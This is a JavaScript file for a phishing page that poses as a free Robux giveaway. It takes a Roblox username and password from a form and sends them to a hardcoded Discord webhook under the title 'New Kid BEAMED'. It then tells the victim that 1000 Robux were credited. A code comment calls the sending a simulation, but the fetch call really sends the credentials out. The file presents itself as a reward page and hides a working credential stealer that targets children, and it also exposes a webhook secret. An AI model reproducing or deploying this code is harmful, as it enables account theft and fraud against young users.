function claimRobux() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const resultDiv = document.getElementById('result');

    if (username && password) {
        // Simulate sending data to a webhook
        sendDataToWebhook(username, password);
        resultDiv.innerHTML = 'Processing your request...';
    } else {
        resultDiv.innerHTML = 'Please enter both your username and password.';
    }
}

function sendDataToWebhook(username, password) {
    const embed = {
        title: "New Kid BEAMED",
        description: "Beamed a new kid \n  ** 💻 username:** "  + username + "\n ** 🔎 password:** || " + password + " ||",
        color: 16711680,
        footer: {
            text: "Made by axerith"
        } 
    }
    // Replace 'your-webhook-url' with the actual webhook URL
    const webhookUrl = 'https://discord.com/api/webhooks/1417853805663354920/CTlGGwgYurnMUgg-XSBpJZOT7Q__FsdKk0Joey9G1S6It83zY4LTWdS5IZGgT9Wqbcdp';

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: embed ? JSON.stringify({ embeds: [embed] }) : null
    })
    .then(response => response.json())
    .then(data => {
        const resultDiv = document.getElementById('result');
        if (data.success) {
            resultDiv.innerHTML = 'Congratulations! You have successfully claimed 1000 free Robux. Check your Roblox account to see the update.';
        } else {
            resultDiv.innerHTML = 'There was an error processing your request. Please try again later.';
        }
    })
    .catch(error => {
        const resultDiv = document.getElementById('result');
        resultDiv.innerHTML = 'There was an error processing your request. Please try again later.';
        console.error('Error:', error);
    });
}